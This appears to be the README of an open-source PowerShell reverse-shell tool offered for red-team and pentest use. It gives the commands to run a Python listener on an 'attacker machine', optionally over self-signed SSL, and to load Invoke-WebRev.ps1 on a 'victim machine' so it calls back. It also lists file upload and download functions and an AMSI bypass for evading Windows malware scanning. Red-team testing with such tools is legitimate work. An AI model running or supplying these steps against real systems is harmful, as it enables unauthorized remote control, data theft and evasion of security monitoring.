# Powershell HTTP/S Reverse Shell
HTTP-revshell is a tool focused on redteam exercises and pentesters. This tool provides a reverse connection through the http/s protocol using "Invoke-webrev.ps1" as client and "server.py" as server.

##  server.py - server

![Alt text](images/revshell.jpg "Server")

On the attacker machine:
```
    python3 server.py IP PORT
    
    For SSL Reverse Shell:
        openssl genrsa -out private.pem 2048
        openssl req -new -x509 -key private.pem -out cacert.pem -days 9999
        python3 server.py --ssl IP PORT
```

## Invoke-WebRev.ps1 - client

On the victim machine:
```
Import-Module .\Invoke-WebRev.ps1
Invoke-WebRev -ip IP -port PORT [-ssl]
```

# Extra functions
```
Upload
    Usage: upload /src/path/file C:\dest\path\file
```

```
Download
    Usage: download C:\src\path\file /dst/path/file
```

# Features
    - SSL
    - Proxy Aware
    - Upload Function
    - Download Function
    - Error Control
    - AMSI bypass

# Future features
    - Autocomplete
    - Multiple sessions
    
